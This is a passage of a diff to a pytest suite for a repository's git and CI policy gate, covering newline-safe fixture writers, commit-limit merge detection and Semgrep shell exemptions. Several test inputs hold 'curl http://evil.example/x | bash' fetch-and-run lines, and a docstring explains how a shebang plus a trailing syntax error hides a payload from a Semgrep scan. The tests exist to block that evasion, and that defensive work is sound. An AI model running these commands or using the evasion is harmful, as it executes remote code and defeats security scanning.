@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import ast
 import io
 import json
 import os
@@ -94,10 +95,25 @@ def _init_repo(repo: Path, branch: str = "feature/test") -> None:
 def _commit_file(repo: Path, relative_path: str, content: str) -> str:
     path = repo / relative_path
     path.parent.mkdir(parents=True, exist_ok=True)
-    path.write_text(content, encoding="utf-8")
+    path.write_bytes(content.encode("utf-8"))
     _git(repo, "add", "--", relative_path)
     _git(repo, "commit", "-qm", f"test: add {Path(relative_path).name}")
     return _git(repo, "rev-parse", "HEAD").stdout.strip()
+
+
+def _write_file(repo: Path, relative_path: str, content: str) -> None:
+    """Write a worktree file as the bytes it was handed.
+
+    `Path.write_text` translates `\n` to `os.linesep`, so a caller asking for
+    `a\nb` puts `a\r\nb` on disk under Windows. `_commit_file` writes bytes, so
+    a test that seeded a path one way and revised it the other produced two
+    revisions differing on every line, and any diff taken across them was of
+    the line endings rather than the edit. This is the same primitive, so the
+    two agree on every platform.
+    """
+    path = repo / relative_path
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_bytes(content.encode("utf-8"))
 
 
 def _copy_runtime_config(repo: Path) -> None:
@@ -1461,7 +1477,7 @@ def test_stage_fixed_restages_only_the_formatted_input(tmp_path: Path) -> None:
     _commit_file(repo, "source.py", "before\n")
     _git(repo, "add", "lefthook.yml", "fixer.py")
     _git(repo, "commit", "-qm", "test: add formatter")
-    (repo / "source.py").write_text("changed\n", encoding="utf-8")
+    _write_file(repo, "source.py", "changed\n")
     _git(repo, "add", "source.py")
 
     _run_lefthook(repo, "run", "pre-commit", "--force")
@@ -1949,9 +1965,9 @@ def test_staged_dash_policy_reads_the_index_blob(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     _commit_file(repo, "doc.md", "clean\n")
-    (repo / "doc.md").write_text(f"bad {chr(0x2014)} text\n", encoding="utf-8")
+    _write_file(repo, "doc.md", f"bad {chr(0x2014)} text\n")
     _git(repo, "add", "doc.md")
-    (repo / "doc.md").write_text("working tree clean\n", encoding="utf-8")
+    _write_file(repo, "doc.md", "working tree clean\n")
 
     assert policy.check_staged_dashes(["doc.md"], repo) == 1
     assert policy.check_staged_dashes([], repo) == 0
@@ -2174,7 +2190,7 @@ def test_alternate_index_controls_staged_blob_and_generated_staging(
     alternate_index = repo / ".git/alternate-index"
     shutil.copy2(repo / ".git/index", alternate_index)
     monkeypatch.setenv("GIT_INDEX_FILE", str(alternate_index))
-    (repo / "doc.md").write_text(f"bad {chr(0x2014)} text\n", encoding="utf-8")
+    _write_file(repo, "doc.md", f"bad {chr(0x2014)} text\n")
     _git(repo, "add", "doc.md")
     generated.unlink()
 
@@ -2399,7 +2415,7 @@ def test_generated_staging_uses_the_named_allowlist(tmp_path: Path) -> None:
     _init_repo(repo)
     _commit_file(repo, ".vscode/mcp.json", '{"version": 1}\n')
     (repo / ".factory").mkdir()
-    (repo / ".vscode/mcp.json").write_text('{"version": 2}\n', encoding="utf-8")
+    _write_file(repo, ".vscode/mcp.json", '{"version": 2}\n')
     (repo / ".factory/mcp.json").write_text("{}\n", encoding="utf-8")
     (repo / "unrelated.txt").write_text("do not stage\n", encoding="utf-8")
 
@@ -2582,12 +2598,11 @@ def test_pushed_suppression_scan_ignores_clean_worktree_override(tmp_path: Path)
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "nested/source.py", "value = 1\n")
-    source = repo / "nested/source.py"
-    source.write_text(f"value = 1  {'# no' + 'sec'}\n", encoding="utf-8")
+    _write_file(repo, "nested/source.py", f"value = 1  {'# no' + 'sec'}\n")
     _git(repo, "add", "nested/source.py")
     _git(repo, "commit", "-qm", "test: pushed suppression")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
-    source.write_text("value = 1\n", encoding="utf-8")
+    _write_file(repo, "nested/source.py", "value = 1\n")
     stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")
 
     assert policy.check_pushed_suppressions(stream, repo) == 1
@@ -2628,8 +2643,7 @@ def test_pushed_suppression_scan_ignores_unchanged_legacy_suppressions(
     _init_repo(repo)
     _commit_file(repo, "legacy.py", f"value = 1  {'# no' + 'sec'}\n")
     base = _commit_file(repo, "source.py", "value = 1\n")
-    source = repo / "source.py"
-    source.write_text("value = 2\n", encoding="utf-8")
+    _write_file(repo, "source.py", "value = 2\n")
     _git(repo, "add", "source.py")
     _git(repo, "commit", "-qm", "test: update clean source")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -2646,12 +2660,11 @@ def test_pushed_semgrep_scan_materializes_immutable_head(
     _init_repo(repo)
     _commit_file(repo, "nested/source.py", "value = 1\n")
     base = _commit_file(repo, "unchanged.py", "dangerous = True\n")
-    source = repo / "nested/source.py"
-    source.write_text("dangerous = True\n", encoding="utf-8")
+    _write_file(repo, "nested/source.py", "dangerous = True\n")
     _git(repo, "add", "nested/source.py")
     _git(repo, "commit", "-qm", "test: pushed finding")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
-    source.write_text("dangerous = False\n", encoding="utf-8")
+    _write_file(repo, "nested/source.py", "dangerous = False\n")
 
     def fake_scan(
         tree: Path,
@@ -2676,7 +2689,7 @@ def test_pushed_semgrep_scan_reads_export_ignored_changed_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "nested/source.py", "value = 1\n")
-    (repo / "nested/source.py").write_text("dangerous = True\n", encoding="utf-8")
+    _write_file(repo, "nested/source.py", "dangerous = True\n")
     (repo / ".gitattributes").write_text(
         "nested/source.py export-ignore\n",
         encoding="utf-8",
@@ -2707,10 +2720,7 @@ def test_pushed_semgrep_scan_reads_unsubstituted_changed_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "source.js", "const safe = true;\n")
-    (repo / "source.js").write_text(
-        "const value = '$Format:a%eval(userInput);$';\n",
-        encoding="utf-8",
-    )
+    _write_file(repo, "source.js", "const value = '$Format:a%eval(userInput);$';\n")
     (repo / ".gitattributes").write_text("source.js export-subst\n", encoding="utf-8")
     _git(repo, "add", "source.js", ".gitattributes")
     _git(repo, "commit", "-qm", "test: substitute pushed finding")
@@ -2738,7 +2748,7 @@ def test_pushed_semgrep_scan_ignores_local_replacement_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "source.py", "dangerous = False\n")
-    (repo / "source.py").write_text("dangerous = True\n", encoding="utf-8")
+    _write_file(repo, "source.py", "dangerous = True\n")
     _git(repo, "add", "source.py")
     _git(repo, "commit", "-qm", "test: pushed finding")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -4097,10 +4107,7 @@ def test_changed_line_map_reads_real_git_diff(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo, branch="main")
     base = _commit_file(repo, "mod.py", "line one\nline two\nline three\n")
-    (repo / "mod.py").write_text(
-        "line one\nline TWO changed\nline three\nline four\nline five\n",
-        encoding="utf-8",
-    )
+    _write_file(repo, "mod.py", "line one\nline TWO changed\nline three\nline four\nline five\n")
     _git(repo, "add", "--", "mod.py")
     _git(repo, "commit", "-qm", "test: modify mod.py")
 
@@ -4552,6 +4559,203 @@ def test_head_blob_reader_returns_content(tmp_path: Path) -> None:
     assert policy._read_head_blob(repo, "tracked") == raw
 
 
+def test_committed_crlf_survives_the_trip_through_the_test_helper(tmp_path: Path) -> None:
+    """`_commit_file` has to store the bytes it was handed, on every platform.
+
+    The helper used `Path.write_text`, whose default newline handling
+    translates `\\n` to `os.linesep`. On Windows this content reached git as
+    `a\\r\\r\\nb\\r\\n`, so the reader below correctly returned bytes the
+    caller never asked for and the fixture looked like a broken reader. A
+    text-mode reader hid it by folding the endings back on the way out.
+
+    `os.linesep` is `\\n` here, so this test cannot fail on Linux. It pins the
+    contract that the helper stores the bytes it was handed, and Windows CI is
+    what exercises it.
+    """
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "tracked", "a\r\nb\n")
+
+    assert policy._read_head_blob(repo, "tracked") == b"a\r\nb\n"
+
+
+def test_a_committed_lone_carriage_return_is_not_expanded(tmp_path: Path) -> None:
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "tracked", "a\rb")
+
+    assert policy._read_head_blob(repo, "tracked") == b"a\rb"
+
+
+def test_a_worktree_write_stores_the_bytes_it_was_handed(tmp_path: Path) -> None:
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+
+    _write_file(repo, "tracked", "one\ntwo\n")
+
+    assert (repo / "tracked").read_bytes() == b"one\ntwo\n"
+
+
+def test_a_worktree_write_leaves_carriage_returns_alone(tmp_path: Path) -> None:
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+
+    _write_file(repo, "tracked", "one\r\ntwo\r")
+
+    assert (repo / "tracked").read_bytes() == b"one\r\ntwo\r"
+
+
+def test_a_worktree_write_creates_the_parent_directory(tmp_path: Path) -> None:
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+
+    _write_file(repo, "nested/deeper/tracked", "content\n")
+
+    assert (repo / "nested/deeper/tracked").read_bytes() == b"content\n"
+
+
+def test_seeding_and_revising_a_file_differ_only_where_the_text_differs(
+    tmp_path: Path,
+) -> None:
+    """Pin the two fixture writers against each other.
+
+    `_commit_file` seeds a path and `_write_file` revises it, so a diff across
+    the pair has to show the edited line and nothing else. When the two used
+    different newline handling this diff was every line under Windows, which is
+    how `test_changed_line_map_reads_real_git_diff` failed there while passing
+    everywhere else. `os.linesep` is `\n` on Linux, so this cannot go red here;
+    Windows CI is what exercises it.
+    """
+    repo = tmp_path / "repo"
+    _init_repo(repo, branch="main")
+    base = _commit_file(repo, "mod.py", "one\ntwo\nthree\n")
+    _write_file(repo, "mod.py", "one\nTWO\nthree\n")
+    _git(repo, "add", "--", "mod.py")
+    _git(repo, "commit", "-qm", "test: revise mod.py")
+
+    changed = policy._changed_line_map(["mod.py"], repo, base)
+
+    assert changed is not None
+    assert changed["mod.py"] == {2}
+
+
+def _repo_relative_path(node: ast.expr) -> str | None:
+    """Return `repo:a/b` for `repo / "a" / "b"`, else None."""
+    parts: list[str] = []
+    while isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
+        if not isinstance(node.right, ast.Constant) or not isinstance(node.right.value, str):
+            return None
+        parts.append(node.right.value)
+        node = node.left
+    if not (isinstance(node, ast.Name) and parts):
+        return None
+    return node.id + ":" + "/".join(reversed(parts))
+
+
+def _functions_writing_one_path_two_ways(source: str) -> dict[str, list[str]]:
+    """Name every function that writes one repo path with both primitives.
+
+    Resolves single-assignment local aliases. A scan that only matched literal
+    paths reported this module clean while three functions still mixed, because
+    each bound the path to a local first. That blind spot is why this is a test
+    rather than a claim in a description.
+    """
+    found: dict[str, list[str]] = {}
+    for fn in ast.walk(ast.parse(source)):
+        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            continue
+        alias: dict[str, str] = {}
+        committed: set[str] = set()
+        texted: set[str] = set()
+        for node in ast.walk(fn):
+            if (
+                isinstance(node, ast.Assign)
+                and len(node.targets) == 1
+                and isinstance(node.targets[0], ast.Name)
+            ):
+                key = _repo_relative_path(node.value)
+                if key is not None:
+                    alias[node.targets[0].id] = key
+            if not isinstance(node, ast.Call):
+                continue
+            if (
+                isinstance(node.func, ast.Name)
+                and node.func.id in {"_commit_file", "_write_file"}
+                and len(node.args) >= 2
+                and isinstance(node.args[0], ast.Name)
+                and isinstance(node.args[1], ast.Constant)
+                and isinstance(node.args[1].value, str)
+            ):
+                committed.add(f"{node.args[0].id}:{node.args[1].value}")
+            if isinstance(node.func, ast.Attribute) and node.func.attr == "write_text":
+                key = _repo_relative_path(node.func.value)
+                if key is None and isinstance(node.func.value, ast.Name):
+                    key = alias.get(node.func.value.id)
+                if key is not None:
+                    texted.add(key)
+        shared = sorted(committed & texted)
+        if shared:
+            found[fn.name] = shared
+    return found
+
+
+def test_no_function_writes_one_repo_path_with_both_primitives() -> None:
+    """The fixture writers must not disagree about newlines within one path.
+
+    `_commit_file` and `_write_file` write bytes; `Path.write_text` translates
+    `\n` to `os.linesep`. A function that seeds a path one way and revises it
+    the other produced two revisions differing on every line under Windows, so
+    any diff taken across them measured the line endings rather than the edit.
+    """
+    source = Path(__file__).read_text(encoding="utf-8")
+
+    assert _functions_writing_one_path_two_ways(source) == {}
+
+
+def test_the_mixed_writer_scan_sees_a_write_named_inline() -> None:
+    source = (
+        "def t(repo):\n"
+        "    _commit_file(repo, 'a.py', 'x\\n')\n"
+        "    (repo / 'a.py').write_text('y\\n')\n"
+    )
+
+    assert _functions_writing_one_path_two_ways(source) == {"t": ["repo:a.py"]}
+
+
+def test_the_mixed_writer_scan_sees_a_write_through_a_local_alias() -> None:
+    """The shape a literal-only scan missed, which let three of these through."""
+    source = (
+        "def t(repo):\n"
+        "    _commit_file(repo, 'nested/a.py', 'x\\n')\n"
+        "    source = repo / 'nested' / 'a.py'\n"
+        "    source.write_text('y\\n')\n"
+    )
+
+    assert _functions_writing_one_path_two_ways(source) == {"t": ["repo:nested/a.py"]}
+
+
+def test_the_mixed_writer_scan_leaves_two_different_paths_alone() -> None:
+    """Only one path written both ways is a defect; two paths are not."""
+    source = (
+        "def t(repo):\n"
+        "    _commit_file(repo, 'a.py', 'x\\n')\n"
+        "    other = repo / 'b.py'\n"
+        "    other.write_text('y\\n')\n"
+    )
+
+    assert _functions_writing_one_path_two_ways(source) == {}
+
+
+def test_the_head_blob_reader_returns_none_for_a_path_no_commit_holds(
+    tmp_path: Path,
+) -> None:
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "tracked", "content\n")
+
+    assert policy._read_head_blob(repo, "absent") is None
+
+
 def test_branch_policy_reports_git_configuration_error(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -4868,6 +5072,42 @@ def test_commit_limit_blocks_when_bypass_check_fails(
     assert policy._check_commit_limit(update, tmp_path) == 1
 
 
+def test_commit_limit_prints_bypass_explanation_with_blocking_error(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    update = policy.PushUpdate(
+        source=policy.PushRef("refs/heads/local", "1" * 40, "refs/tags/v1", "2" * 40),
+        base="base",
+        head="head",
+        range_spec="base..head",
+        destination_branch=None,
+    )
+    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "21\n"))
+    monkeypatch.setattr(
+        policy,
+        "_run_command",
+        lambda *_args, **_kwargs: _completed(1, stdout="no open PR for local\n"),
+    )
+
+    assert policy._check_commit_limit(update, tmp_path) == 1
+
+    captured = capsys.readouterr()
+    assert captured.out == ""
+    assert captured.err == "no open PR for local\nERROR: push has 21 commits, limit is 20\n"
+
+
+def test_advisory_failure_prints_process_explanation_with_warning(
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    policy._print_advisory_failure("plugin version check", _completed(2, stdout="reason\n"))
+
+    captured = capsys.readouterr()
+    assert captured.out == ""
+    assert captured.err == "reason\nWARNING: plugin version check failed without blocking\n"
+
+
 def test_commit_limit_relaxes_for_merge_from_main(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -4879,13 +5119,47 @@ def test_commit_limit_relaxes_for_merge_from_main(
             return _completed(0, "30\n")
         if args[:2] == ["rev-list", "--merges"]:
             return _completed(0, "merge-sha\n")
-        if args[:3] == ["show", "-s", "--format=%P"]:
+        if args[:2] == ["rev-list", "--first-parent"]:
+            return _completed(0, "main-parent\nolder-main\n")
+        if args[0] == "show" and "--format=%P" in args:
             return _completed(0, "first-parent main-parent\n")
         return _completed(0)
 
     monkeypatch.setattr(policy, "_run_git", fake_git)
 
     assert policy._check_commit_limit(update, tmp_path) == 0
+
+
+def test_commit_limit_holds_when_the_merged_parent_is_off_main_trunk(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The negative control for the test above.
+
+    Only the trunk answer changes. A parent main can reach but did not reach
+    by first parent is a branch main landed, and the wider limit is refused.
+    """
+    update = _push_update()
+
+    def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
+        if args[:2] == ["rev-list", "--count"]:
+            return _completed(0, "30\n")
+        if args[:2] == ["rev-list", "--merges"]:
+            return _completed(0, "merge-sha\n")
+        if args[:2] == ["rev-list", "--first-parent"]:
+            return _completed(0, "some-other-main-commit\n")
+        if args[0] == "show" and "--format=%P" in args:
+            return _completed(0, "first-parent landed-parent\n")
+        return _completed(0)
+
+    monkeypatch.setattr(policy, "_run_git", fake_git)
+    monkeypatch.setattr(
+        policy,
+        "_run_command",
+        lambda *_args, **_kwargs: _completed(1, stderr="no bypass\n"),
+    )
+
+    assert policy._check_commit_limit(update, tmp_path) == 1
 
 
 def test_main_merge_detection_handles_git_errors(
@@ -4907,6 +5181,233 @@ def test_main_merge_detection_rejects_non_main_second_parent(
     monkeypatch.setattr(policy, "_run_git", lambda *_args: next(responses))
 
     assert not policy._merge_has_main_parent("merge", tmp_path)
+
+
+# A session fixture in tests/conftest.py injects `commit.gpgsign=false` through
+# GIT_CONFIG_COUNT, which outranks repo config. The command line outranks the
+# injection in turn, so signing is requested there and nowhere else.
+_SIGNING = ("-c", "commit.gpgsign=true")
+
+
+def _sign_with_ssh(repo: Path) -> None:
+    """Make this repo sign its commits, using the backend that needs no keyring.
+
+    Verification is left to fail. An unknown signer still makes git print a
+    verification line, which is the decoration under test.
+    """
+    keygen = shutil.which("ssh-keygen")
+    if keygen is None:
+        pytest.skip("ssh-keygen is required to build a signed history")
+    key = repo / "signing-key"
+    subprocess.run(
+        [keygen, "-q", "-t", "ed25519", "-N", "", "-C", "t", "-f", str(key)],
+        cwd=repo,
+        capture_output=True,
+        check=False,
+    )
+    if not key.with_suffix(".pub").exists():
+        pytest.skip("ssh-keygen produced no key on this host")
+    _git(repo, "config", "gpg.format", "ssh")
+    _git(repo, "config", "user.signingkey", str(key.with_suffix(".pub")))
+
+
+def _repo_with_a_signed_merge(tmp_path: Path, of_main: bool) -> tuple[Path, str]:
+    """Build a repo holding one signed merge, and ask to see the signatures.
+
+    `of_main` chooses which merge. False builds one whose second parent is a
+    side branch and whose first parent is an ancestor of `origin/main`, which
+    is not a merge of main and must not raise the commit limit. True builds a
+    real merge of main, the case the limit is raised for.
+    """
+    repo = tmp_path / ("merge-of-main" if of_main else "merge-of-side")
+    _init_repo(repo, branch="main")
+    _sign_with_ssh(repo)
+    _commit_file(repo, "base.md", "base\n")
+    # Named refs only. A raw sha as a branch point is not resolvable under this
+    # suite's git environment (Refs #3661).
+    _git(repo, "branch", "side")
+    _git(repo, "branch", "pivot")
+    main_head = _commit_file(repo, "main-only.md", "main\n")
+    _git(repo, "update-ref", "refs/remotes/origin/main", main_head)
+    _git(repo, "checkout", "-q", "side")
+    _commit_file(repo, "side-only.md", "side\n")
+    if of_main:
+        _git(repo, *_SIGNING, "merge", "-q", "--no-ff", "-m", "merge main", "main")
+    else:
+        _git(repo, "checkout", "-q", "pivot")
+        _git(repo, *_SIGNING, "merge", "-q", "--no-ff", "-m", "merge side", "side")
+    merge = _git(repo, "rev-parse", "HEAD").stdout.strip()
+    assert "gpgsig" in _git(repo, "cat-file", "commit", merge).stdout
+    # The setting under test lives in the developer's own config.
+    _git(repo, "config", "log.showSignature", "true")
+    return repo, merge
+
+
+def test_main_merge_detection_reads_a_signed_merge(tmp_path: Path) -> None:
+    """`log.showSignature` decorates `git show` as well as `git log`.
+
+    The parents are read by splitting that output and skipping the first
+    field, which is the merge's own first parent. Prefixed with a
+    verification report, the first field is a word of that report instead,
+    so the first parent joins the parents searched for main. A merge of a
+    side branch made from a commit main already holds then reports as a
+    merge of main, which doubles the commit limit this push is held to.
+    """
+    repo, merge = _repo_with_a_signed_merge(tmp_path, of_main=False)
+
+    assert policy._merge_has_main_parent(merge, repo) is False
+
+
+def test_main_merge_detection_still_reads_a_signed_merge_of_main(
+    tmp_path: Path,
+) -> None:
+    """The negative control for the test above.
+
+    Naming the signature behaviour must not stop a real merge of main from
+    being found, which is the case the raised limit exists for.
+    """
+    repo, merge = _repo_with_a_signed_merge(tmp_path, of_main=True)
+
+    assert policy._merge_has_main_parent(merge, repo) is True
+
+
+def _repo_where_main_has_landed_a_branch(tmp_path: Path, name: str) -> Path:
+    """Build a repo whose main landed a feature branch through a merge.
+
+    `origin/main` then contains that branch's tip, but the tip is the second
+    parent of the merge that landed it, not a commit on main's own trunk.
+    Branch `trunk-landing` names the landing merge, and main carries one
+    commit past it, so a merge of an older trunk commit can be told from a
+    merge of main's tip.
+    """
+    repo = tmp_path / name
+    _init_repo(repo, branch="main")
+    _commit_file(repo, "base.md", "base\n")
+    # Named refs only. A raw sha as a branch point is not resolvable under this
+    # suite's git environment (Refs #3661).
+    _git(repo, "branch", "local")
+    _git(repo, "branch", "landed")
+    _git(repo, "checkout", "-q", "landed")
+    _commit_file(repo, "landed.md", "landed\n")
+    _git(repo, "checkout", "-q", "main")
+    _git(repo, "merge", "-q", "--no-ff", "-m", "land the feature", "landed")
+    _git(repo, "branch", "trunk-landing")
+    _commit_file(repo, "after.md", "after\n")
+    _git(repo, "update-ref", "refs/remotes/origin/main", "HEAD")
+    _git(repo, "checkout", "-q", "local")
+    return repo
+
+
+def _merge_into_local(repo: Path, ref: str) -> str:
+    _git(repo, "merge", "-q", "--no-ff", "-m", f"merge {ref}", ref)
+    return _git(repo, "rev-parse", "HEAD").stdout.strip()
+
+
+def test_merging_a_branch_main_already_landed_is_not_a_merge_of_main(
+    tmp_path: Path,
+) -> None:
+    """A landed branch is an ancestor of main, and that is not enough.
+
+    Merging a branch main has already landed brings in no history main did
+    not already hand out, so it is not the case the raised limit exists for.
+    Reading the parent as main's because main can reach it lets any developer
+    take the wider limit by merging a branch whose pull request has landed,
+    which is ordinary git usage rather than an attack.
+    """
+    repo = _repo_where_main_has_landed_a_branch(tmp_path, "landed-branch")
+    merge = _merge_into_local(repo, "landed")
+
+    assert policy._merge_has_main_parent(merge, repo) is False
+
+
+def test_merging_main_itself_is_still_a_merge_of_main(tmp_path: Path) -> None:
+    """The negative control. The case the raised limit exists for still reads."""
+    repo = _repo_where_main_has_landed_a_branch(tmp_path, "merge-of-main")
+    merge = _merge_into_local(repo, "main")
+
+    assert policy._merge_has_main_parent(merge, repo) is True
+
+
+def test_merging_an_older_commit_on_main_is_a_merge_of_main(tmp_path: Path) -> None:
+    """Main's trunk is not just its tip.
+
+    A developer who merges main and then falls behind has still merged main,
+    so every commit main reaches by first parent counts, not only the newest.
+    """
+    repo = _repo_where_main_has_landed_a_branch(tmp_path, "older-main")
+    merge = _merge_into_local(repo, "trunk-landing")
+
+    assert policy._merge_has_main_parent(merge, repo) is True
+
+
+def test_a_landed_branch_does_not_widen_the_commit_limit(tmp_path: Path) -> None:
+    """The consumer reads the same way the detector does.
+
+    The limit is what this gate actually holds a push to, so the detector's
+    verdict is checked where it is spent as well as where it is made.
+    """
+    repo = _repo_where_main_has_landed_a_branch(tmp_path, "limit-landed")
+    base = _git(repo, "rev-parse", "local").stdout.strip()
+    for index in range(21):
+        _git(repo, "commit", "-q", "--allow-empty", "-m", f"local {index:02d}")
+    head = _merge_into_local(repo, "landed")
+    update = policy.PushUpdate(
+        policy.PushRef("refs/heads/local", head, "refs/heads/local", base),
+        base,
+        head,
+        f"{base}..{head}",
+        "local",
+    )
+
+    assert policy._contains_main_merge(update, repo) is False
+
+
+def test_a_merge_is_not_a_merge_of_main_when_there_is_no_origin_main(
+    tmp_path: Path,
+) -> None:
+    """The edge case. An unreadable trunk must not widen the limit.
+
+    A clone that has never fetched `origin/main` cannot say what main's trunk
+    holds. Reading nothing as reaching everything would hand the wider limit
+    to exactly the repos the gate knows least about.
+    """
+    repo = _repo_where_main_has_landed_a_branch(tmp_path, "no-origin")
+    _git(repo, "update-ref", "-d", "refs/remotes/origin/main")
+    merge = _merge_into_local(repo, "main")
+
+    assert policy._main_trunk_commits(repo) == frozenset()
+    assert policy._merge_has_main_parent(merge, repo) is False
+
+
+def test_the_main_trunk_is_read_once_for_one_push(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Reading main's trunk per merge walks the same history many times.
+
+    The walk is cheap on a small repo and is not cheap on a long-lived one,
+    and a push may legitimately carry many merges. Reading it once per push
+    keeps the cost flat in the number of merges pushed.
+    """
+    update = _push_update()
+    trunk_reads: list[Sequence[str]] = []
+
+    def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
+        if args[:2] == ["rev-list", "--count"]:
+            return _completed(0, "5\n")
+        if args[:2] == ["rev-list", "--merges"]:
+            return _completed(0, "".join(f"merge-{index}\n" for index in range(25)))
+        if args[:2] == ["rev-list", "--first-parent"]:
+            trunk_reads.append(args)
+            return _completed(0, "a-main-commit\n")
+        if args[0] == "show" and "--format=%P" in args:
+            return _completed(0, "first-parent a-landed-branch\n")
+        return _completed(0)
+
+    monkeypatch.setattr(policy, "_run_git", fake_git)
+
+    assert policy._contains_main_merge(update, tmp_path) is False
+    assert len(trunk_reads) == 1
 
 
 def test_review_marker_reports_git_error(
@@ -5338,7 +5839,12 @@ def test_immutable_suppression_error_and_clean_paths(
     monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1, stderr="error"))
     assert policy.check_pushed_suppressions(io.StringIO(ref_line), tmp_path) == 2
 
-    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "clean\n"))
+    def clean_suppression_git(_repo: Path, args: list[str]) -> subprocess.CompletedProcess[str]:
+        if args[0] == "diff" and "--name-status" in args:
+            return _completed(0, "")
+        return _completed(0, "clean\n")
+
+    monkeypatch.setattr(policy, "_run_git", clean_suppression_git)
     assert policy.check_pushed_suppressions(io.StringIO(ref_line), tmp_path) == 0
 
 
@@ -6304,17 +6810,80 @@ def test_semgrep_allows_code_two_error_at_bash_step_with_actions_expression(
     [
         "pwsh",
         "powershell",
-        "PowerShell.exe",
-        "python",
+        "PowerShell",
+        "python3",
         "python3 {0}",
-        "node",
-        "ruby",
-        "perl",
-        "cmd /C",
     ],
 )
 def test_non_bash_shells_defeat_the_bash_subparse(shell: str) -> None:
     assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python",
+        "python {0}",
+        "Python",
+        "python2",
+        "python2 {0}",
+    ],
+)
+def test_bare_python_is_not_an_exempt_shell(shell: str) -> None:
+    """A shell no workflow declares must not earn a sub-parse exemption.
+
+    `_is_non_bash_shell` gates an exemption, not a warning: a match makes
+    `_step_defeats_bash_subparse` return True and the body skips the Bash
+    scan. Measured across `.github/workflows/`, the declared shells are 38
+    `pwsh`, 29 `bash`, and 2 `python3`. No step declares `python`, so the
+    `python3?` form widened the exempt surface for nothing.
+
+    `python` is a valid GitHub Actions shell keyword, so this is a
+    fail-closed narrowing rather than a correctness fix: a future
+    `shell: python` step would be Bash-scanned instead of exempted. Adding
+    it back is a deliberate act with a workflow to point at.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+PWSH_CALL_TEMPLATE = """pwsh -NoProfile -Command "& '{0}'\""""
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "#!/bin/bash\ncurl http://evil.example/x | bash\nif [\n",
+        "#!/bin/sh\ncurl http://evil.example/x | sh\nif [\n",
+        "#!/usr/bin/env bash\ncurl http://evil.example/x | bash\nif [\n",
+        "\n\n#!/bin/bash\ncurl http://evil.example/x | bash\nif [\n",
+        "#!/usr/bin/python3\nimport os\nos.system('curl http://evil.example/x | bash')\nif [\n",
+    ],
+)
+def test_a_shebang_body_is_never_tolerated_under_a_foreign_shell(body: str) -> None:
+    """A `#!` line, not the `shell:` value, decides what executes the body.
+
+    The runner writes a custom-shell body to an executable temp file. PowerShell's
+    call operator hands that file to the OS rather than parsing it, the kernel
+    honours the shebang, and Bash runs the body. Bash executes every command
+    before a syntax error, so a trailing `if [` hides a Semgrep finding while the
+    payload above it still runs. Verified locally: with the shebang the payload
+    runs under this exact template; without it the exec fails.
+    """
+    assert policy._step_defeats_bash_subparse(PWSH_CALL_TEMPLATE, body) is False
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "$ErrorActionPreference = 'Stop'\nif ($x) { Write-Host 1 }\n",
+        "Write-Host 'hello'\n",
+        "# a comment that is not a shebang\nWrite-Host 'hi'\n",
+        "#not-a-shebang\nWrite-Host 'hi'\n",
+    ],
+)
+def test_shebangless_bodies_still_tolerate_under_a_foreign_shell(body: str) -> None:
+    """The guard must not cost the 16 real workflow files their carve-out."""
+    assert policy._step_defeats_bash_subparse(PWSH_CALL_TEMPLATE, body) is True
 
 
 @pytest.mark.parametrize(
@@ -6478,7 +7047,7 @@ def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
         "pwsh",
         "pwsh -NoProfile -Command \"& '{0}'\"",
         "python3 {0}",
-        "powershell.exe",
+        "powershell",
     ],
 )
 def test_shells_naming_only_their_own_interpreter_are_non_bash(shell: str) -> None:
@@ -6528,9 +7097,71 @@ def test_shells_merely_prefixed_by_an_interpreter_are_not_treated_as_non_bash(sh
     assert policy._is_non_bash_shell(shell) is False
 
 
-@pytest.mark.parametrize("shell", ["cmd /C", "cmd /S /C", "powershell.exe", "pwsh.exe -NoProfile"])
+@pytest.mark.parametrize("shell", ["powershell", "pwsh -NoProfile", "python3"])
 def test_windows_shell_flags_stay_non_bash(shell: str) -> None:
     assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "powershell.exe",
+        "pwsh.exe -NoProfile",
